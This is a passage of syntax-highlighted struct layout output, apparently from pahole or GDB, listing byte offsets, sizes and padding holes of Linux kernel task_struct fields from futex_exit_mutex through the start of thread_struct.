</span></span><span class="line"><span class="cl"><span class="cm">/* 3672      |     4 */</span>        <span class="kt">raw_spinlock_t</span> <span class="n">wait_lock</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 3676      |     4 */</span>        <span class="k">struct</span> <span class="n">optimistic_spin_queue</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 3676      |     4 */</span>            <span class="kt">atomic_t</span> <span class="n">tail</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                                   <span class="cm">/* total size (bytes):    4 */</span>
</span></span><span class="line"><span class="cl">                               <span class="p">}</span> <span class="n">osq</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 3680      |    16 */</span>        <span class="k">struct</span> <span class="n">list_head</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 3680      |     8 */</span>            <span class="k">struct</span> <span class="n">list_head</span> <span class="o">*</span><span class="n">next</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 3688      |     8 */</span>            <span class="k">struct</span> <span class="n">list_head</span> <span class="o">*</span><span class="n">prev</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                                   <span class="cm">/* total size (bytes):   16 */</span>
</span></span><span class="line"><span class="cl">                               <span class="p">}</span> <span class="n">wait_list</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                               <span class="cm">/* total size (bytes):   32 */</span>
</span></span><span class="line"><span class="cl">                           <span class="p">}</span> <span class="n">futex_exit_mutex</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 3696      |     4 */</span>    <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">futex_state</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* XXX  4-byte hole  */</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 3704      |     8 */</span>    <span class="k">struct</span> <span class="n">perf_event_context</span> <span class="o">*</span><span class="n">perf_event_ctxp</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 3712      |    32 */</span>    <span class="k">struct</span> <span class="n">mutex</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 3712      |     8 */</span>        <span class="kt">atomic_long_t</span> <span class="n">owner</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 3720      |     4 */</span>        <span class="kt">raw_spinlock_t</span> <span class="n">wait_lock</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 3724      |     4 */</span>        <span class="k">struct</span> <span class="n">optimistic_spin_queue</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 3724      |     4 */</span>            <span class="kt">atomic_t</span> <span class="n">tail</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                                   <span class="cm">/* total size (bytes):    4 */</span>
</span></span><span class="line"><span class="cl">                               <span class="p">}</span> <span class="n">osq</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 3728      |    16 */</span>        <span class="k">struct</span> <span class="n">list_head</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 3728      |     8 */</span>            <span class="k">struct</span> <span class="n">list_head</span> <span class="o">*</span><span class="n">next</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 3736      |     8 */</span>            <span class="k">struct</span> <span class="n">list_head</span> <span class="o">*</span><span class="n">prev</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                                   <span class="cm">/* total size (bytes):   16 */</span>
</span></span><span class="line"><span class="cl">                               <span class="p">}</span> <span class="n">wait_list</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                               <span class="cm">/* total size (bytes):   32 */</span>
</span></span><span class="line"><span class="cl">                           <span class="p">}</span> <span class="n">perf_event_mutex</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 3744      |    16 */</span>    <span class="k">struct</span> <span class="n">list_head</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 3744      |     8 */</span>        <span class="k">struct</span> <span class="n">list_head</span> <span class="o">*</span><span class="n">next</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 3752      |     8 */</span>        <span class="k">struct</span> <span class="n">list_head</span> <span class="o">*</span><span class="n">prev</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                               <span class="cm">/* total size (bytes):   16 */</span>
</span></span><span class="line"><span class="cl">                           <span class="p">}</span> <span class="n">perf_event_list</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 3760      |     8 */</span>    <span class="k">struct</span> <span class="n">mempolicy</span> <span class="o">*</span><span class="n">mempolicy</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 3768      |     2 */</span>    <span class="kt">short</span> <span class="n">il_prev</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 3770      |     2 */</span>    <span class="kt">short</span> <span class="n">pref_node_fork</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 3772      |     4 */</span>    <span class="kt">int</span> <span class="n">numa_scan_seq</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 3776      |     4 */</span>    <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">numa_scan_period</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 3780      |     4 */</span>    <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">numa_scan_period_max</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 3784      |     4 */</span>    <span class="kt">int</span> <span class="n">numa_preferred_nid</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* XXX  4-byte hole  */</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 3792      |     8 */</span>    <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">numa_migrate_retry</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 3800      |     8 */</span>    <span class="n">u64</span> <span class="n">node_stamp</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 3808      |     8 */</span>    <span class="n">u64</span> <span class="n">last_task_numa_placement</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 3816      |     8 */</span>    <span class="n">u64</span> <span class="n">last_sum_exec_runtime</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 3824      |    16 */</span>    <span class="k">struct</span> <span class="n">callback_head</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 3824      |     8 */</span>        <span class="k">struct</span> <span class="n">callback_head</span> <span class="o">*</span><span class="n">next</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 3832      |     8 */</span>        <span class="kt">void</span> <span class="p">(</span><span class="o">*</span><span class="n">func</span><span class="p">)(</span><span class="k">struct</span> <span class="n">callback_head</span> <span class="o">*</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                               <span class="cm">/* total size (bytes):   16 */</span>
</span></span><span class="line"><span class="cl">                           <span class="p">}</span> <span class="n">numa_work</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 3840      |     8 */</span>    <span class="k">struct</span> <span class="n">numa_group</span> <span class="o">*</span><span class="n">numa_group</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 3848      |     8 */</span>    <span class="kt">unsigned</span> <span class="kt">long</span> <span class="o">*</span><span class="n">numa_faults</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 3856      |     8 */</span>    <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">total_numa_faults</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 3864      |    24 */</span>    <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">numa_faults_locality</span><span class="p">[</span><span class="mi">3</span><span class="p">];</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 3888      |     8 */</span>    <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">numa_pages_migrated</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 3896      |     8 */</span>    <span class="k">struct</span> <span class="n">rseq</span> <span class="o">*</span><span class="n">rseq</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 3904      |     4 */</span>    <span class="n">u32</span> <span class="n">rseq_len</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 3908      |     4 */</span>    <span class="n">u32</span> <span class="n">rseq_sig</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 3912      |     8 */</span>    <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">rseq_event_mask</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 3920      |     4 */</span>    <span class="kt">int</span> <span class="n">mm_cid</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 3924      |     4 */</span>    <span class="kt">int</span> <span class="n">last_mm_cid</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 3928      |     4 */</span>    <span class="kt">int</span> <span class="n">migrate_from_cpu</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 3932      |     4 */</span>    <span class="kt">int</span> <span class="n">mm_cid_active</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 3936      |    16 */</span>    <span class="k">struct</span> <span class="n">callback_head</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 3936      |     8 */</span>        <span class="k">struct</span> <span class="n">callback_head</span> <span class="o">*</span><span class="n">next</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 3944      |     8 */</span>        <span class="kt">void</span> <span class="p">(</span><span class="o">*</span><span class="n">func</span><span class="p">)(</span><span class="k">struct</span> <span class="n">callback_head</span> <span class="o">*</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                               <span class="cm">/* total size (bytes):   16 */</span>
</span></span><span class="line"><span class="cl">                           <span class="p">}</span> <span class="n">cid_work</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 3952      |  1032 */</span>    <span class="k">struct</span> <span class="n">tlbflush_unmap_batch</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 3952      |  1024 */</span>        <span class="k">struct</span> <span class="n">arch_tlbflush_unmap_batch</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 3952      |  1024 */</span>            <span class="k">struct</span> <span class="n">cpumask</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 3952      |  1024 */</span>                <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">bits</span><span class="p">[</span><span class="mi">128</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                                       <span class="cm">/* total size (bytes): 1024 */</span>
</span></span><span class="line"><span class="cl">                                   <span class="p">}</span> <span class="n">cpumask</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                                   <span class="cm">/* total size (bytes): 1024 */</span>
</span></span><span class="line"><span class="cl">                               <span class="p">}</span> <span class="n">arch</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 4976      |     1 */</span>        <span class="kt">bool</span> <span class="n">flush_required</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 4977      |     1 */</span>        <span class="kt">bool</span> <span class="n">writable</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* XXX  6-byte padding  */</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                               <span class="cm">/* total size (bytes): 1032 */</span>
</span></span><span class="line"><span class="cl">                           <span class="p">}</span> <span class="n">tlb_ubc</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 4984      |     8 */</span>    <span class="k">struct</span> <span class="n">pipe_inode_info</span> <span class="o">*</span><span class="n">splice_pipe</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 4992      |    16 */</span>    <span class="k">struct</span> <span class="n">page_frag</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 4992      |     8 */</span>        <span class="k">struct</span> <span class="n">page</span> <span class="o">*</span><span class="n">page</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 5000      |     4 */</span>        <span class="n">__u32</span> <span class="n">offset</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 5004      |     4 */</span>        <span class="n">__u32</span> <span class="n">size</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                               <span class="cm">/* total size (bytes):   16 */</span>
</span></span><span class="line"><span class="cl">                           <span class="p">}</span> <span class="n">task_frag</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 5008      |     8 */</span>    <span class="k">struct</span> <span class="n">task_delay_info</span> <span class="o">*</span><span class="n">delays</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 5016      |     4 */</span>    <span class="kt">int</span> <span class="n">nr_dirtied</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 5020      |     4 */</span>    <span class="kt">int</span> <span class="n">nr_dirtied_pause</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 5024      |     8 */</span>    <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">dirty_paused_when</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 5032      |     8 */</span>    <span class="n">u64</span> <span class="n">timer_slack_ns</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 5040      |     8 */</span>    <span class="n">u64</span> <span class="n">default_timer_slack_ns</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 5048      |     4 */</span>    <span class="kt">int</span> <span class="n">curr_ret_stack</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 5052      |     4 */</span>    <span class="kt">int</span> <span class="n">curr_ret_depth</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 5056      |     8 */</span>    <span class="k">struct</span> <span class="n">ftrace_ret_stack</span> <span class="o">*</span><span class="n">ret_stack</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 5064      |     8 */</span>    <span class="kt">unsigned</span> <span class="kt">long</span> <span class="kt">long</span> <span class="n">ftrace_timestamp</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 5072      |     4 */</span>    <span class="kt">atomic_t</span> <span class="n">trace_overrun</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 5076      |     4 */</span>    <span class="kt">atomic_t</span> <span class="n">tracing_graph_pause</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 5080      |     8 */</span>    <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">trace_recursion</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 5088      |     8 */</span>    <span class="k">struct</span> <span class="n">mem_cgroup</span> <span class="o">*</span><span class="n">memcg_in_oom</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 5096      |     4 */</span>    <span class="kt">gfp_t</span> <span class="n">memcg_oom_gfp_mask</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 5100      |     4 */</span>    <span class="kt">int</span> <span class="n">memcg_oom_order</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 5104      |     4 */</span>    <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">memcg_nr_pages_over_high</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* XXX  4-byte hole  */</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 5112      |     8 */</span>    <span class="k">struct</span> <span class="n">mem_cgroup</span> <span class="o">*</span><span class="n">active_memcg</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 5120      |     8 */</span>    <span class="k">struct</span> <span class="n">gendisk</span> <span class="o">*</span><span class="n">throttle_disk</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 5128      |     8 */</span>    <span class="k">struct</span> <span class="n">uprobe_task</span> <span class="o">*</span><span class="n">utask</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 5136      |     4 */</span>    <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">sequential_io</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 5140      |     4 */</span>    <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">sequential_io_avg</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 5144      |     0 */</span>    <span class="k">struct</span> <span class="n">kmap_ctrl</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="o">&lt;</span><span class="n">no</span> <span class="n">data</span> <span class="n">fields</span><span class="o">&gt;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                               <span class="cm">/* total size (bytes):    0 */</span>
</span></span><span class="line"><span class="cl">                           <span class="p">}</span> <span class="n">kmap_ctrl</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 5144      |    16 */</span>    <span class="k">struct</span> <span class="n">callback_head</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 5144      |     8 */</span>        <span class="k">struct</span> <span class="n">callback_head</span> <span class="o">*</span><span class="n">next</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 5152      |     8 */</span>        <span class="kt">void</span> <span class="p">(</span><span class="o">*</span><span class="n">func</span><span class="p">)(</span><span class="k">struct</span> <span class="n">callback_head</span> <span class="o">*</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                               <span class="cm">/* total size (bytes):   16 */</span>
</span></span><span class="line"><span class="cl">                           <span class="p">}</span> <span class="n">rcu</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 5160      |     4 */</span>    <span class="kt">refcount_t</span> <span class="n">rcu_users</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 5164      |     4 */</span>    <span class="kt">int</span> <span class="n">pagefault_disabled</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 5168      |     8 */</span>    <span class="k">struct</span> <span class="n">task_struct</span> <span class="o">*</span><span class="n">oom_reaper_list</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 5176      |    40 */</span>    <span class="k">struct</span> <span class="n">timer_list</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 5176      |    16 */</span>        <span class="k">struct</span> <span class="n">hlist_node</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 5176      |     8 */</span>            <span class="k">struct</span> <span class="n">hlist_node</span> <span class="o">*</span><span class="n">next</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 5184      |     8 */</span>            <span class="k">struct</span> <span class="n">hlist_node</span> <span class="o">**</span><span class="n">pprev</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                                   <span class="cm">/* total size (bytes):   16 */</span>
</span></span><span class="line"><span class="cl">                               <span class="p">}</span> <span class="n">entry</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 5192      |     8 */</span>        <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">expires</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 5200      |     8 */</span>        <span class="kt">void</span> <span class="p">(</span><span class="o">*</span><span class="n">function</span><span class="p">)(</span><span class="k">struct</span> <span class="n">timer_list</span> <span class="o">*</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 5208      |     4 */</span>        <span class="n">u32</span> <span class="n">flags</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* XXX  4-byte padding  */</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                               <span class="cm">/* total size (bytes):   40 */</span>
</span></span><span class="line"><span class="cl">                           <span class="p">}</span> <span class="n">oom_reaper_timer</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 5216      |     8 */</span>    <span class="k">struct</span> <span class="n">vm_struct</span> <span class="o">*</span><span class="n">stack_vm_area</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 5224      |     4 */</span>    <span class="kt">refcount_t</span> <span class="n">stack_refcount</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 5228      |     4 */</span>    <span class="kt">int</span> <span class="n">patch_state</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 5232      |     8 */</span>    <span class="kt">void</span> <span class="o">*</span><span class="n">security</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 5240      |     8 */</span>    <span class="k">struct</span> <span class="n">bpf_local_storage</span> <span class="o">*</span><span class="n">bpf_storage</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 5248      |     8 */</span>    <span class="k">struct</span> <span class="n">bpf_run_ctx</span> <span class="o">*</span><span class="n">bpf_ctx</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 5256      |     8 */</span>    <span class="kt">void</span> <span class="o">*</span><span class="n">mce_vaddr</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 5264      |     8 */</span>    <span class="n">__u64</span> <span class="n">mce_kflags</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 5272      |     8 */</span>    <span class="n">u64</span> <span class="n">mce_addr</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 5280: 0   |     8 */</span>    <span class="n">__u64</span> <span class="nl">mce_ripv</span> <span class="p">:</span> <span class="mi">1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 5280: 1   |     8 */</span>    <span class="n">__u64</span> <span class="nl">mce_whole_page</span> <span class="p">:</span> <span class="mi">1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 5280: 2   |     8 */</span>    <span class="n">__u64</span> <span class="nl">__mce_reserved</span> <span class="p">:</span> <span class="mi">62</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 5288      |    16 */</span>    <span class="k">struct</span> <span class="n">callback_head</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 5288      |     8 */</span>        <span class="k">struct</span> <span class="n">callback_head</span> <span class="o">*</span><span class="n">next</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 5296      |     8 */</span>        <span class="kt">void</span> <span class="p">(</span><span class="o">*</span><span class="n">func</span><span class="p">)(</span><span class="k">struct</span> <span class="n">callback_head</span> <span class="o">*</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                               <span class="cm">/* total size (bytes):   16 */</span>
</span></span><span class="line"><span class="cl">                           <span class="p">}</span> <span class="n">mce_kill_me</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 5304      |     4 */</span>    <span class="kt">int</span> <span class="n">mce_count</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* XXX  4-byte hole  */</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 5312      |     8 */</span>    <span class="k">struct</span> <span class="n">llist_head</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 5312      |     8 */</span>        <span class="k">struct</span> <span class="n">llist_node</span> <span class="o">*</span><span class="n">first</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                               <span class="cm">/* total size (bytes):    8 */</span>
</span></span><span class="line"><span class="cl">                           <span class="p">}</span> <span class="n">kretprobe_instances</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 5320      |     8 */</span>    <span class="k">struct</span> <span class="n">llist_head</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 5320      |     8 */</span>        <span class="k">struct</span> <span class="n">llist_node</span> <span class="o">*</span><span class="n">first</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                               <span class="cm">/* total size (bytes):    8 */</span>
</span></span><span class="line"><span class="cl">                           <span class="p">}</span> <span class="n">rethooks</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 5328      |    16 */</span>    <span class="k">struct</span> <span class="n">callback_head</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 5328      |     8 */</span>        <span class="k">struct</span> <span class="n">callback_head</span> <span class="o">*</span><span class="n">next</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 5336      |     8 */</span>        <span class="kt">void</span> <span class="p">(</span><span class="o">*</span><span class="n">func</span><span class="p">)(</span><span class="k">struct</span> <span class="n">callback_head</span> <span class="o">*</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                               <span class="cm">/* total size (bytes):   16 */</span>
</span></span><span class="line"><span class="cl">                           <span class="p">}</span> <span class="n">l1d_flush_kill</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* XXX 32-byte hole  */</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 5376      |  4416 */</span>    <span class="k">struct</span> <span class="n">thread_struct</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 5376      |    24 */</span>        <span class="k">struct</span> <span class="n">desc_struct</span> <span class="n">tls_array</span><span class="p">[</span><span class="mi">3</span><span class="p">];</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 5400      |     8 */</span>        <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">sp</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 5408      |     2 */</span>        <span class="kt">unsigned</span> <span class="kt">short</span> <span class="n">es</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 5410      |     2 */</span>        <span class="kt">unsigned</span> <span class="kt">short</span> <span class="n">ds</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 5412      |     2 */</span>        <span class="kt">unsigned</span> <span class="kt">short</span> <span class="n">fsindex</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 5414      |     2 */</span>        <span class="kt">unsigned</span> <span class="kt">short</span> <span class="n">gsindex</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 5416      |     8 */</span>        <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">fsbase</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 5424      |     8 */</span>        <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">gsbase</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 5432      |    32 */</span>        <span class="k">struct</span> <span class="n">perf_event</span> <span class="o">*</span><span class="n">ptrace_bps</span><span class="p">[</span><span class="mi">4</span><span class="p">];</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 5464      |     8 */</span>        <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">virtual_dr6</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 5472      |     8 */</span>        <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">ptrace_dr7</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 5480      |     8 */</span>        <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">cr2</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 5488      |     8 */</span>        <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">trap_nr</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 5496      |     8 */</span>        <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">error_code</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 5504      |     8 */</span>        <span class="k">struct</span> <span class="n">io_bitmap</span> <span class="o">*</span><span class="n">io_bitmap</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 5512      |     8 */</span>        <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">iopl_emul</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 5520: 0   |     4 */</span>        <span class="kt">unsigned</span> <span class="kt">int</span> <span class="nl">iopl_warn</span> <span class="p">:</span> <span class="mi">1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 5520: 1   |     4 */</span>        <span class="kt">unsigned</span> <span class="kt">int</span> <span class="nl">sig_on_uaccess_err</span> <span class="p">:</span> <span class="mi">1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* XXX  6-bit hole   */</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* XXX  3-byte hole  */</span>
